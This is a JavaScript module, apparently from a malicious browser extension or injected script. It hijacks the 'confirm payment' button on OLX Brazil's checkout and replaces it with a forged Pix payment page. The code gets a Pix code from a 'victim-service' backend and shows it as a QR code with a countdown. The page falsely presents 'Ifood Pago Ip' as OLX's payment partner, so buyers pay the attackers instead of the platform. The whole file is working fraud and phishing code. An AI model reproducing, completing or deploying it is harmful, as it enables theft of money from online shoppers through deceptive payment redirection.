import { findConfirmPaymentButton } from "../finders.js";
import { getAdId, getPixPaymentValue } from "../getters.js";
import { EXPIRED_PIX_ILLUSTRATION_SVG } from "../expired-pix-illustration.js";
import { createPixPaymentAsync } from "../../../nexus/victim-service/service.js";
import qrcode from "../../../libs/qrcode.js";
import { showHijackedPaymentFlow, hideHijackedPaymentFlow } from "../state.js";

qrcode.stringToBytes = qrcode.stringToBytesFuncs["UTF-8"];

const HIJACKED_PAYMENT_CONFIRMATION_ATTR = "data-olx-patch-hijacked-payment-confirmation";
const PIX_COUNTDOWN_INTERVAL_ATTR = "data-olx-pix-countdown-interval";
const PIX_EXPIRED_ATTR = "data-olx-pix-expired";

const PIX_ICON_SVG = `<svg width="44" height="44" viewBox="0 0 44 44" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path fill-rule="evenodd" clip-rule="evenodd" d="M10.5455 10.6243C12.2257 10.6243 13.8056 11.2787 14.9938 12.4661L21.4404 18.9141C21.9047 19.3781 22.6628 19.3802 23.1285 18.9134L29.5516 12.4896C30.7398 11.3022 32.3197 10.6478 34.0002 10.6478H34.7738L26.6152 2.48957C24.0745 -0.0512111 19.9554 -0.0512111 17.4147 2.48957L9.27995 10.6243H10.5455ZM34.0006 33.3392C32.3201 33.3392 30.7401 32.6848 29.552 31.4973L23.1288 25.0742C22.678 24.622 21.892 24.6233 21.4411 25.0742L14.9941 31.5208C13.806 32.7083 12.226 33.3623 10.5458 33.3623H9.27995L17.415 41.4977C19.9558 44.0382 24.0751 44.0382 26.6156 41.4977L34.7741 33.3392H34.0006ZM36.5771 12.4594L41.5069 17.3896C44.0477 19.9301 44.0477 24.0494 41.5069 26.5902L36.5771 31.5201C36.4682 31.4766 36.3511 31.4496 36.2267 31.4496H33.9855C32.8263 31.4496 31.6921 30.9798 30.8733 30.1599L24.4501 23.7375C23.2858 22.5721 21.255 22.5724 20.0896 23.7368L13.643 30.1837C12.8238 31.0029 11.6896 31.4728 10.5308 31.4728H7.77439C7.65692 31.4728 7.54671 31.5008 7.44306 31.5398L2.49348 26.5902C-0.0473047 24.0494 -0.0473047 19.9301 2.49348 17.3896L7.44341 12.4397C7.54705 12.4788 7.65692 12.5067 7.77439 12.5067H10.5308C11.6896 12.5067 12.8238 12.9766 13.643 13.7958L20.0903 20.2431C20.6911 20.8436 21.4802 21.1445 22.27 21.1445C23.0592 21.1445 23.849 20.8436 24.4498 20.2428L30.8733 13.8193C31.6921 12.9998 32.8263 12.5299 33.9855 12.5299H36.2267C36.3508 12.5299 36.4682 12.5029 36.5771 12.4594Z" fill="#32BCAD"></path></svg>`;

const COPY_ICON_SVG = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-hidden="true"><path fill-rule="evenodd" d="M11,8.25 L20,8.25 C21.5187831,8.25 22.75,9.48121694 22.75,11 L22.75,20 C22.75,21.5187831 21.5187831,22.75 20,22.75 L11,22.75 C9.48121694,22.75 8.25,21.5187831 8.25,20 L8.25,11 C8.25,9.48121694 9.48121694,8.25 11,8.25 Z M11,9.75 C10.3096441,9.75 9.75,10.3096441 9.75,11 L9.75,20 C9.75,20.6903559 10.3096441,21.25 11,21.25 L20,21.25 C20.6903559,21.25 21.25,20.6903559 21.25,20 L21.25,11 C21.25,10.3096441 20.6903559,9.75 20,9.75 L11,9.75 Z M5,14.25 C5.41421356,14.25 5.75,14.5857864 5.75,15 C5.75,15.4142136 5.41421356,15.75 5,15.75 L4,15.75 C2.48121694,15.75 1.25,14.5187831 1.25,13 L1.25,4 C1.25,2.48121694 2.48121694,1.25 4,1.25 L13,1.25 C14.5187831,1.25 15.75,2.48121694 15.75,4 L15.75,5 C15.75,5.41421356 15.4142136,5.75 15,5.75 C14.5857864,5.75 14.25,5.41421356 14.25,5 L14.25,4 C14.25,3.30964406 13.6903559,2.75 13,2.75 L4,2.75 C3.30964406,2.75 2.75,3.30964406 2.75,4 L2.75,13 C2.75,13.6903559 3.30964406,14.25 4,14.25 L5,14.25 Z" fill="currentColor"></path></svg>`;

const ALERTBOX_WARNING_ICON_SVG = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-hidden="true"><path fill-rule="evenodd" d="M12,22.75 C6.06293894,22.75 1.25,17.9370611 1.25,12 C1.25,6.06293894 6.06293894,1.25 12,1.25 C17.9370611,1.25 22.75,6.06293894 22.75,12 C22.75,17.9370611 17.9370611,22.75 12,22.75 Z M12,21.25 C17.1086339,21.25 21.25,17.1086339 21.25,12 C21.25,6.89136606 17.1086339,2.75 12,2.75 C6.89136606,2.75 2.75,6.89136606 2.75,12 C2.75,17.1086339 6.89136606,21.25 12,21.25 Z M11.25,8 C11.25,7.58578644 11.5857864,7.25 12,7.25 C12.4142136,7.25 12.75,7.58578644 12.75,8 L12.75,12 C12.75,12.4142136 12.4142136,12.75 12,12.75 C11.5857864,12.75 11.25,12.4142136 11.25,12 L11.25,8 Z M12,16 C11.4477153,16 11,15.5522847 11,15 C11,14.4477153 11.4477153,14 12,14 C12.5522847,14 13,14.4477153 13,15 C13,15.5522847 12.5522847,16 12,16 Z" fill="currentColor"></path></svg>`;

const COUNTDOWN_CLOCK_ICON_SVG = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-hidden="true" color="#999999"><path fill-rule="evenodd" d="M12,22.75 C6.06293894,22.75 1.25,17.9370611 1.25,12 C1.25,6.06293894 6.06293894,1.25 12,1.25 C17.9370611,1.25 22.75,6.06293894 22.75,12 C22.75,17.9370611 17.9370611,22.75 12,22.75 Z M12,21.25 C17.1086339,21.25 21.25,17.1086339 21.25,12 C21.25,6.89136606 17.1086339,2.75 12,2.75 C6.89136606,2.75 2.75,6.89136606 2.75,12 C2.75,17.1086339 6.89136606,21.25 12,21.25 Z M12.75,6 L12.75,11.6893398 L15.5303301,14.4696699 C15.8232233,14.7625631 15.8232233,15.2374369 15.5303301,15.5303301 C15.2374369,15.8232233 14.7625631,15.8232233 14.4696699,15.5303301 L11.4696699,12.5303301 C11.3290176,12.3896778 11.25,12.1989124 11.25,12 L11.25,6 C11.25,5.58578644 11.5857864,5.25 12,5.25 C12.4142136,5.25 12.75,5.58578644 12.75,6 Z" fill="#999999"></path></svg>`;

const LOADING_SPINNER_SVG = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" class="olx-core-spinner olx-core-spinner--huge" role="status" aria-label="Loading"><path d="M21 12a9 9 0 11-6.219-8.56"></path></svg>`;

const DEFAULT_PAYMENT_RECIPIENT = "Ifood Pago Ip";

let creatingPix = false;

function hijackPaymentConfirmationButton() {
    const button = findConfirmPaymentButton();
    if (!button || button.hasAttribute(HIJACKED_PAYMENT_CONFIRMATION_ATTR)) {
        return;
    }

    const replacement = button.cloneNode(true);
    replacement.setAttribute(HIJACKED_PAYMENT_CONFIRMATION_ATTR, "true");
    replacement.addEventListener("click", (event) => {
        event.preventDefault();
        event.stopImmediatePropagation();
        onPaymentConfirmationButtonClicked();
    });

    button.replaceWith(replacement);
}

function saveMain() {
    const main = getMain();
    if (!main) {
        return null;
    }

    const backup = document.createDocumentFragment();
    for (const child of [...main.childNodes]) {
        backup.appendChild(child);
    }

    return backup;
}

function restoreMain(backup) {
    const main = getMain();
    if (!main || !backup) {
        return;
    }

    main.replaceChildren();
    while (backup.firstChild) {
        main.appendChild(backup.firstChild);
    }
}

function closeModal() {
    document.getElementById("modal-root")?.replaceChildren();
}

function buildPixLoaderPage() {
    const root = document.createElement("div");
    root.className = "flex h-full flex-col items-center gap-2 justify-center pt-0 pb-10";
    root.dataset.testid = "PixLoader";
    root.innerHTML = `
        <div class="flex w-full max-w-xl flex-col items-center justify-center gap-2 px-4">
            <div class="flex flex-col items-center justify-center">
                <div class="rounded-5 flex">${LOADING_SPINNER_SVG}</div>
                <div class="mt-2 flex flex-col text-center">
                    <span class="typo-title-large mb-1 text-center">Estamos gerando seu código PIX. Aguarde...</span>
                </div>
            </div>
        </div>
    `;

    return root;
}

function showError(message) {
    const main = getMain();
    if (!main) {
        return;
    }

    const alertWrapper = document.createElement("div");
    alertWrapper.className = "px-4 pt-4";
    alertWrapper.setAttribute("data-olx-patch-payment-error", "true");
    alertWrapper.innerHTML = `
        <div data-ds-componet="DS-Alertbox" class="olx-alertbox olx-alertbox--error" role="alert" title="">
            <div class="olx-alertbox__content-wrapper">
                <div class="olx-alertbox__content">
                    <div class="olx-alertbox__description">
                        <p class="typo-body-medium">${escapeHtml(message)}</p>
                    </div>
                </div>
            </div>
        </div>
    `;

    main.prepend(alertWrapper);
}

async function onPaymentConfirmationButtonClicked() {
    if (creatingPix) {
        return;
    }

    creatingPix = true;

    let mainBackup = null;

    try {
        const value = getPixPaymentValue();
        const adId = getAdId();

        mainBackup = saveMain();
        closeModal();
        showHijackedPaymentFlow();
        setMain(buildPixLoaderPage());

        const payment = await createPixPaymentAsync({ adId, value });

        const pixCode = payment?.pixCode;
        if (!pixCode) {
            throw new Error(payment?.error ?? payment?.message ?? "Não foi possível gerar o código Pix.");
        }

        setMain(buildPixQrCodePage({
            pixCode,
            value: payment.value ?? value,
            expirationTimeSeconds: payment.expirationTimeSeconds,
            paymentRecipient: payment.paymentRecipient ?? DEFAULT_PAYMENT_RECIPIENT,
        }));
    } catch (error) {
        hideHijackedPaymentFlow();

        if (mainBackup) {
            restoreMain(mainBackup);
        }

        const message = error instanceof Error
            ? error.message
            : "Não foi possível gerar o código Pix.";

        showError(message);
        console.error("onPaymentConfirmationButtonClicked:", error);
    } finally {
        creatingPix = false;
    }
}

function escapeHtml(text) {
    return String(text)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;");
}

function formatPixPrice(value) {
    return `R$ ${Number(value).toLocaleString("pt-BR", {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2,
    })}`;
}

function expiresAtFromSeconds(expirationTimeSeconds) {
    const seconds = Number(expirationTimeSeconds);

    if (!Number.isFinite(seconds) || seconds <= 0) {
        return Date.now();
    }

    return Date.now() + seconds * 1000;
}

function formatCountdown(remainingMs) {
    const totalSeconds = Math.max(0, Math.ceil(remainingMs / 1000));
    const minutes = Math.floor(totalSeconds / 60);
    const seconds = totalSeconds % 60;

    return `${String(minutes).padStart(2, "0")}m ${String(seconds).padStart(2, "0")}s`;
}

function stopCountdown(root) {
    const intervalId = Number(root.getAttribute(PIX_COUNTDOWN_INTERVAL_ATTR));
    if (intervalId) {
        clearInterval(intervalId);
        root.removeAttribute(PIX_COUNTDOWN_INTERVAL_ATTR);
    }
}

function startCountdown(root, expirationTimeSeconds, { onExpired } = {}) {
    stopCountdown(root);

    const expiresAt = expiresAtFromSeconds(expirationTimeSeconds);
    const totalDurationMs = Math.max(1, expiresAt - Date.now());
    const barTrack = root.querySelector("[data-olx-pix-countdown-bar-track]");
    const timerLabel = root.querySelector("[data-olx-pix-countdown-label]");

    if (!barTrack || !timerLabel) {
        return;
    }

    let hasExpired = false;

    const updateCountdown = () => {
        const remainingMs = Math.max(0, expiresAt - Date.now());
        const barWidth = (remainingMs / totalDurationMs) * 100;

        barTrack.style.setProperty("--bar-width", `${barWidth}%`);
        timerLabel.textContent = formatCountdown(remainingMs);

        if (remainingMs <= 0) {
            stopCountdown(root);

            if (!hasExpired) {
                hasExpired = true;
                onExpired?.();
            }
        }
    };

    updateCountdown();

    const intervalId = window.setInterval(updateCountdown, 1000);
    root.setAttribute(PIX_COUNTDOWN_INTERVAL_ATTR, String(intervalId));
}

function getMain() {
    return document.getElementById("main");
}

function setMain(content) {
    const main = getMain();
    if (!main || !content) {
        return;
    }

    main.replaceChildren(content);
}

function wireExpiredPixPageButtons(root) {
    const viewAdButton = root.querySelector("[data-olx-pix-view-ad-button]");
    if (viewAdButton) {
        viewAdButton.addEventListener("click", (event) => {
            event.preventDefault();
            window.history.back();
        });
    }

    const purchaseDetailsButton = root.querySelector("[data-olx-pix-purchase-details-button]");
    if (purchaseDetailsButton) {
        purchaseDetailsButton.hidden = true;
    }
}

function buildExpiredPixPage() {
    const root = document.createElement("div");
    root.className = "flex h-full flex-col items-center gap-2 pt-6";
    root.dataset.testid = "ExpiredPixViewComponent";
    root.innerHTML = `
        <div class="flex w-full max-w-xl flex-col items-center justify-center gap-2 px-4">
            <div class="flex flex-col items-center justify-center">
                <div class="rounded-5 flex">${EXPIRED_PIX_ILLUSTRATION_SVG}</div>
                <div class="mt-2 flex flex-col text-center">
                    <span class="typo-title-large mb-1 text-center">O código Pix expirou</span>
                    <span class="typo-body-medium">O prazo para pagamento do seu pedido expirou, volte ao anúncio e realize a compra novamente.</span>
                    <span class="typo-body-medium">Se você já pagou, aguarde a confirmação em detalhes da compra.</span>
                </div>
            </div>
        </div>
        <div class="bg-neutral-70 border-neutral-90 space-y-0-5 sticky bottom-0 mt-auto w-full border-t p-2 md:mt-0 md:max-w-lg md:border-t-0 md:pt-0 lg:relative">
            <button type="button" class="olx-core-button olx-core-button--primary olx-core-button--medium w-full" data-olx-pix-view-ad-button>Ver anúncio</button>
            <button type="button" class="olx-core-button olx-core-button--link olx-core-button--medium w-full" data-olx-pix-purchase-details-button hidden>Detalhes da compra</button>
        </div>
    `;

    wireExpiredPixPageButtons(root);
    return root;
}

function showExpiredPixPage() {
    if (document.querySelector(`[${PIX_EXPIRED_ATTR}="true"]`)) {
        return;
    }

    const expiredPage = buildExpiredPixPage();
    expiredPage.setAttribute(PIX_EXPIRED_ATTR, "true");
    setMain(expiredPage);
}

async function copyCode(pixCode) {
    try {
        await navigator.clipboard.writeText(pixCode);
    } catch {
        const textarea = document.createElement("textarea");
        textarea.value = pixCode;
        textarea.setAttribute("readonly", "");
        textarea.style.position = "absolute";
        textarea.style.left = "-9999px";
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand("copy");
        textarea.remove();
    }
}

function wireCopyButtons(root, pixCode) {
    for (const button of root.querySelectorAll("[data-olx-pix-copy-button]")) {
        button.addEventListener("click", (event) => {
            event.preventDefault();
            copyCode(pixCode);
        });
    }
}

function createQrImage(pixCode) {
    const qr = qrcode(0, "M");
    qr.addData(pixCode);
    qr.make();

    const moduleCount = qr.getModuleCount();
    const targetSize = 256;
    const margin = 4;
    const cellSize = Math.max(1, Math.floor((targetSize - margin * 2) / moduleCount));

    const image = document.createElement("img");
    image.width = targetSize;
    image.height = targetSize;
    image.alt = "QR Code Pix";
    image.className = "block";
    image.src = qr.createDataURL(cellSize, margin);
    return image;
}

function buildPixQrCodePage({ pixCode, value, expirationTimeSeconds, paymentRecipient }) {
    const safePixCode = escapeHtml(pixCode);
    const safePaymentRecipient = escapeHtml(paymentRecipient);
    const formattedValue = escapeHtml(formatPixPrice(value));

    const root = document.createElement("div");
    root.className = "pb-2";
    root.dataset.testid = "PixViewComponent";
    root.innerHTML = `
        <div class="border-neutral-90 rounded-1 mx-auto my-2 w-full max-w-xl self-center border p-4 pb-2">
            <div data-ds-componet="DS-Alertbox" class="olx-alertbox olx-alertbox--warning" role="status" title="">
                <div class="olx-alertbox__content-wrapper">
                    <span class="olx-alertbox__icon-wrapper" aria-hidden="true">${ALERTBOX_WARNING_ICON_SVG}</span>
                    <div class="olx-alertbox__content">
                        <span class="olx-alertbox__title" title=""></span>
                        <div class="olx-alertbox__description">
                            <p class="typo-body-medium font-semibold">
                                <span>Não pedimos comprovante do Pix e nem enviamos por e-mail. A OLX, em parceria com a</span>
                                <span><strong> ${safePaymentRecipient}</strong></span>
                                <span>, cuida do pagamento até você receber seu produto!</span>
                            </p>
                        </div>
                    </div>
                </div>
            </div>
            <button type="button" class="my-3 block w-full cursor-pointer border-0 bg-transparent p-0 text-left" data-testid="countdown-wrapper">
                <div class="bg-neutral-80">
                    <div class="flex h-[4px] w-full bg-neutral-100 transition-all duration-2 ease-in-out" data-olx-pix-countdown-bar-track style="--bar-width: 100%;">
                        <div class="bg-primary-100 h-full w-(--bar-width)"></div>
                    </div>
                    <p class="pt-1-5 pr-0-5 pl-0-5 flex items-center justify-center gap-1 pb-1">
                        ${COUNTDOWN_CLOCK_ICON_SVG}
                        <span class="typo-body-medium lg:text-2-5 font-bold">Seu código expira em:</span>
                        <span class="typo-body-medium lg:text-2-5 text-primary-100 font-bold" data-olx-pix-countdown-label>00m 00s</span>
                    </p>
                </div>
            </button>
            <div class="my-3 flex justify-center">
                <div class="flex items-center [&_svg]:h-4 [&_svg]:w-4">
                    ${PIX_ICON_SVG}
                    <div class="ml-1">
                        <span class="typo-body-large block">Pague por Pix</span>
                        <span class="typo-body-large block font-bold">${formattedValue}</span>
                    </div>
                </div>
                <div class="mx-2 w-[1px] bg-[--divider-default-background-color]"></div>
                <div class="flex items-center [&_svg]:h-4 [&_svg]:w-4">
                    <div class="ml-1">
                        <span class="typo-body-large block">Processado por</span>
                        <span class="typo-body-large block font-bold">${safePaymentRecipient}</span>
                    </div>
                </div>
            </div>
            <hr class="olx-divider olx-mb-2" data-ds-component="DS-Divider">
            <span class="typo-body-medium block pb-2">É rápido e prático. Veja como é fácil:</span>
            <span class="typo-body-medium block pb-2">1. Abra o app ou banco de sua preferência, escolha a opção pagar via Pix</span>
            <span class="typo-body-medium block pb-2">2. Escolha pagar Pix com QR Code e escaneie o código abaixo:</span>
            <span class="typo-body-medium block pb-2">
                <span>3. Confira se o pagamento será feito para nosso parceiro </span>
                <strong>${safePaymentRecipient}</strong>, que antes respondia por<strong> Zoop tecnologia</strong>,
                <span> e se todas as informações estão corretas.</span>
            </span>
            <span class="typo-body-medium block pb-2">4. Confirme o pagamento.</span>
            <div class="mt-4 mb-4 flex justify-center" data-olx-pix-qr-code></div>
            <hr class="olx-divider olx-mb-2" data-ds-component="DS-Divider">
            <span class="typo-title-small block pb-2">Ou se preferir, faça o pagamento com o Pix copia e cola</span>
            <span class="typo-body-medium block pb-2">
                <span>Acesse o app do seu banco ou Internet Banking, escolha a opção pagar com</span>
                <span><strong> Pix copia e cola</strong></span>
                <span>. Depois cole o código, confira se o pagamento será feito para nosso parceiro </span>
                <span><strong>${safePaymentRecipient}</strong></span>
                <span> e se todas as informações estão corretas. Confirme o pagamento.</span>
            </span>
            <div>
                <pre data-ds-component="DS-Container" class="!bg-neutral-90 m-0 !mb-2 olx-container olx-container--outlined olx-d-flex olx-pl-1-5 olx-pb-1 olx-pt-1 olx-pr-1-5 olx-ai-center olx-jc-space-between">
                    <span class="typo-body-medium text-neutral-120 overflow-hidden font-bold text-ellipsis whitespace-nowrap">${safePixCode}</span>
                    <button class="olx-core-button olx-core-button--link olx-core-button--small" data-olx-pix-copy-button>Copiar</button>
                </pre>
                <button class="olx-core-button olx-core-button--primary olx-core-button--small w-full" data-olx-pix-copy-button>${COPY_ICON_SVG} Copiar código Pix</button>
            </div>
            <p class="typo-body-medium font-semibold">
                Prontinho! A aprovação é imediata e você pode acompanhar o seu pedido em&nbsp;
                <a data-ds-component="DS-Link" class="olx-link olx-link--medium olx-link--main" href="https://meus-pedidos.olx.com.br/compras" target="_blank">Minhas Compras</a>
            </p>
        </div>
    `;

    const qrCodeContainer = root.querySelector("[data-olx-pix-qr-code]");
    if (qrCodeContainer) {
        qrCodeContainer.appendChild(createQrImage(pixCode));
    }

    wireCopyButtons(root, pixCode);
    startCountdown(root, expirationTimeSeconds, { onExpired: showExpiredPixPage });

    return root;
}

export function patchPaymentConfirmation() {
    hijackPaymentConfirmationButton();
}
